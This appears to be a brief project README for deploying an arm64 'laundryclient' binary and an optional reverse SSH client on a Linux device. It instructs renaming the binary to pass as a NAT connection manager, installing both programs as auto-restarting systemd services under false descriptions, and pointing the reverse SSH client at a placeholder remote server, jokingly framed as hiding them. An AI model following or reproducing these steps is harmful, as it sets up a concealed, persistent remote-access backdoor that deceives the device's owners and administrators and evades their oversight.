## Laundry Client

To run un on arm64 architecture, please compile laundryclient with the following command:
```bash
cross build --target aarch64-unknown-linux-gnu --release
```

Rename the compiled laundryclient binary file to natcon to hide it as a NAT connection manager 😂

```bash
sudo nano /etc/systemd/system/natcon.service
```

```bash
[Unit]
Description=NAT connection manager
After=network.target

[Service]
Type=simple
ExecStart=/etc/natcon
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload 
sudo systemctl enable natcon.service 
sudo systemctl start natcon.service
```

## Reverse SSH Client (Optional)

The client binary file is the pre-compiled reverse_ssh-2.1.3 for arm64. It is provided already but not apart of this repo.

Hide the reverse ssh client as a wireguard client 😂

```bash
sudo nano /etc/systemd/system/wgclient.service
```

```bash
[Unit]
Description=wireguard client
After=network.target

[Service]
Type=simple
ExecStart=/etc/client -d putServerAddressHere:25565 --foreground
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload 
sudo systemctl enable wgclient.service 
sudo systemctl start wgclient.service
```